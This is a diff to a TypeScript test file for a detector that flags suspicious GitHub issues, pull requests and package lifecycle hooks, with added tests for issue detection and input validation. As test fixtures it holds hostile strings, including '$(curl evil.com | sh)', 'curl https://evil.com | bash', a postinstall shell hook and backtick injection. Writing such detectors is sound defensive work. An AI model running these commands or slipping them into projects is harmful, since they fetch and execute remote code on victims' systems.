@@ -4,7 +4,9 @@ import {
   checkCiFiles,
   checkLifecyclePatch,
   detectSuspiciousPR,
+  detectSuspiciousIssue,
   validateInput,
+  validateIssueInput,
 } from "../src/detect.ts";
 import type { DetectionReason } from "../src/detect.ts";
 
@@ -1273,5 +1275,111 @@ describe("checkLifecyclePatch – pnpm and env in dangerous commands", () => {
   it("detects env in postinstall hook", () => {
     const patch = '+    "postinstall": "env -i /bin/sh -c whoami"';
     expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
+  });
+});
+
+// ═════════════════════════════════════════════════════════════════════════════
+// detectSuspiciousIssue
+// ═════════════════════════════════════════════════════════════════════════════
+describe("detectSuspiciousIssue", () => {
+  it("clean issue passes", () => {
+    const result = detectSuspiciousIssue({
+      title: "Bug: login page broken",
+      body: "Steps to reproduce...",
+    });
+    expect(result.suspicious).toBe(false);
+    expect(result.reasons).toEqual([]);
+  });
+
+  it("detects command substitution in title", () => {
+    const result = detectSuspiciousIssue({ title: "$(curl evil.com | sh)" });
+    expect(result.suspicious).toBe(true);
+    expect(result.reasons.some((r) => r.category === "injection")).toBe(true);
+    expect(result.reasons.some((r) => r.message.includes("Issue title"))).toBe(true);
+  });
+
+  it("detects PowerShell in title", () => {
+    const result = detectSuspiciousIssue({ title: "Invoke-Expression malicious" });
+    expect(result.suspicious).toBe(true);
+  });
+
+  it("detects shell execution in body", () => {
+    const result = detectSuspiciousIssue({
+      title: "Innocent title",
+      body: "curl https://evil.com | bash",
+    });
+    expect(result.suspicious).toBe(true);
+    expect(result.reasons.some((r) => r.message.includes("Issue body"))).toBe(true);
+  });
+
+  it("detects backtick injection in title", () => {
+    const result = detectSuspiciousIssue({ title: "`whoami`" });
+    expect(result.suspicious).toBe(true);
+  });
+
+  it("passes when body is undefined", () => {
+    const result = detectSuspiciousIssue({ title: "Normal issue" });
+    expect(result.suspicious).toBe(false);
+  });
+
+  it("passes with empty body", () => {
+    const result = detectSuspiciousIssue({ title: "Normal issue", body: "" });
+    expect(result.suspicious).toBe(false);
+  });
+
+  it("catches injection in both title and body", () => {
+    const result = detectSuspiciousIssue({
+      title: "$(whoami)",
+      body: "Invoke-Expression payload",
+    });
+    expect(result.suspicious).toBe(true);
+    expect(result.reasons.length).toBeGreaterThanOrEqual(2);
+  });
+});
+
+// ═════════════════════════════════════════════════════════════════════════════
+// validateIssueInput
+// ═════════════════════════════════════════════════════════════════════════════
+describe("validateIssueInput", () => {
+  it("valid complete input passes through unchanged", () => {
+    const input = { title: "Bug report", body: "Some description" };
+    const result = validateIssueInput(input);
+    expect(result).toEqual(input);
+  });
+
+  it("missing title defaults to empty string", () => {
+    const result = validateIssueInput({ body: "desc" });
+    expect(result.title).toBe("");
+  });
+
+  it("missing body is undefined", () => {
+    const result = validateIssueInput({ title: "test" });
+    expect(result.body).toBeUndefined();
+  });
+
+  it("null input returns safe defaults", () => {
+    const result = validateIssueInput(null);
+    expect(result.title).toBe("");
+    expect(result.body).toBeUndefined();
+  });
+
+  it.each([
+    ["a string", "hello"],
+    ["a number", 42],
+    ["an array", [1, 2, 3]],
+  ])("non-object input (%s) returns safe defaults", (_description, value) => {
+    const result = validateIssueInput(value);
+    expect(result.title).toBe("");
+    expect(result.body).toBeUndefined();
+  });
+
+  it("truncates oversized title", () => {
+    const result = validateIssueInput({ title: "a".repeat(20_000) });
+    expect(result.title.length).toBe(10_000);
+  });
+
+  it("truncates oversized body", () => {
+    const result = validateIssueInput({ body: "b".repeat(20_000) });
+    expect(result.body!.length).toBe(10_000);
   });
 });
